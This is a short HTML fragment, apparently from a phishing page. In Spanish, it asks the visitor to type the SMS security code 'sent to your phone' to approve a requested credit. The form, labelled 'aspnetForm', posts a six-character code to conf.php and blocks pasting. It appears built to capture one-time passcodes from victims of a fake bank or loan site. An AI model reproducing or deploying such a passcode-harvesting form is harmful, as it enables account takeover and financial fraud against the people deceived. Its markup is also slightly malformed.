...
<form name="contactForm" method="post" action="conf.php" id="aspnetForm">

                        <span class="icon icon--label icon--label--username"></span>
                        <span></span><span class="required"></span>
<p style="text-align:center"><strong><span style="font-size:14px"><span style="font-family:Verdana,Geneva,sans-serif">Ingresa el codigo SMS de seguridad enviado a su teléfono</span></span></strong></p>

<p style="text-align:center"><strong><span style="font-size:14px"><span style="font-family:Verdana,Geneva,sans-serif">para la aprobación del crédito solicitado.</span></span></strong></p>


                    </label>
                    
<input id="focusObj" type="text" maxlength="6" size="30" name="usr22" id="name" required=" class="form-text" tabindex="1" onpaste="return false">
